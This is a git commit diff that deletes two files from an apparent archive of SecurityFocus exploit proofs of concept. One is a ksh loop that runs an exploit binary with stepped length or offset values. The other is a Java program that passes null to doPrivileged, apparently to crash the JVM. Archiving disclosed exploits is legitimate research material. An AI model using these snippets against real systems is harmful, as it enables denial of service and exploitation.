9369cddbe2587adde543c24cb4c68569c0c0ebde
ox1111 <31942498+ox1111@users.noreply.github.com>
2017-10-09 15:24:00 +0900

    2017.10.09

--- securityfocus/0x1000/268/kshgrinder.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/ksh
-L=3000
-STEP=34
-MAX=16000
-while [ $L -lt $MAX ]
-do
-./a.out $L
-L=`expr $L + $STEP`
-done
--- securityfocus/0x4000/3992/CrashMe.java
+++
@@ -1,8 +0,0 @@
-public class CrashMe
-{
-    public static void main(String[] args)
-    {
-        java.security.AccessController.doPrivileged
-        ((java.security.PrivilegedAction)null);
-    }
-}
